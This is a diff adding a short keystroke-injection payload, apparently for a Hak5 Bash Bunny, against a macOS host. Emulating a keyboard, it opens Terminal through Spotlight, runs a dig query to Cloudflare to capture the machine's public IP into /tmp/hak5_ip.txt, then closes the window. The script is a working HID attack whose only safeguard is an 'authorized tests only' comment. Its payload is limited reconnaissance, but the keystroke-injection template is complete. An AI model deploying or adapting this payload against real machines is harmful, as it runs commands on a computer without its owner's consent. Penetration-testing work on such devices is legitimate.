@@ -1,0 +1,21 @@
+#!/bin/bash
+# hak5_mac_ip (macOS host, HID) — opens Terminal and grabs the public IP
+# via Cloudflare's whoami. Writes result to /tmp/hak5_ip.txt on the mac.
+# Authorized tests only.
+LED SETUP
+ATTACKMODE HID
+sleep 3
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+QUACK "REM hak5_mac_ip — authorized tests only" \
+    "DELAY 1000" \
+    "GUI SPACE" "DELAY 400" \
+    "STRING terminal" "ENTER" "DELAY 200" \
+    "STRING dig +short txt ch whoami.cloudflare @1.0.0.1 > /tmp/hak5_ip.txt && cat /tmp/hak5_ip.txt" "ENTER" "DELAY 2000" \
+    "GUI w" "DELAY 200" "ENTER"
+echo "[+] mac_ip injected — public IP grabbed to /tmp/hak5_ip.txt"
+LED FINISH
+exit 0
